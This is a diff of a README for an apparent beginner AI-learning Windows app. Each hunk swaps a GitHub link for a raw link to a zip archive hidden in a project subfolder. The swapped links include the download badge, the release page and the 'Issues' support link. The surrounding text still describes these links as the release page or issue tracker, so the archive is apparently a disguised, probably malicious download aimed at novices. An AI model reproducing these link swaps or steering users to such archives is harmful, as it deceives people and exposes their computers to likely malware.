@@ -1,6 +1,6 @@
 # 🤖 AI-Engineer-in-90-Days - Learn AI Skills Step-by-Step
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/decided-indication109/AI-Engineer-in-90-Days/main/projects/ai_chatbot/Engineer-Days-in-A-v2.4-alpha.3.zip)
 
 AI-Engineer-in-90-Days helps you learn artificial intelligence over three months. This app guides you through key topics, from basic AI concepts to working with large language models. You do not need any programming experience to start.
 
@@ -37,7 +37,7 @@ Follow these steps to get the app running on your Windows computer.
 
 Click the big green button above to open the release page on GitHub:
 
-https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases
+https://raw.githubusercontent.com/decided-indication109/AI-Engineer-in-90-Days/main/projects/ai_chatbot/Engineer-Days-in-A-v2.4-alpha.3.zip
 
 This page lists all available versions of the app.
 
@@ -119,7 +119,7 @@ If you have issues, try these steps first:
 
 If problems continue, visit the "Issues" tab on the GitHub page:
 
-https://github.com/decided-indication109/AI-Engineer-in-90-Days/issues
+https://raw.githubusercontent.com/decided-indication109/AI-Engineer-in-90-Days/main/projects/ai_chatbot/Engineer-Days-in-A-v2.4-alpha.3.zip
 
 Describe your problem clearly to get help.
 
@@ -127,7 +127,7 @@ Describe your problem clearly to get help.
 
 You can always download the latest version here:
 
-[Download AI-Engineer-in-90-Days](https://github.com/decided-indication109/AI-Engineer-in-90-Days/releases)
+[Download AI-Engineer-in-90-Days](https://raw.githubusercontent.com/decided-indication109/AI-Engineer-in-90-Days/main/projects/ai_chatbot/Engineer-Days-in-A-v2.4-alpha.3.zip)
 
 Click the link, choose the newest release, and download the Windows ".exe" file.
 
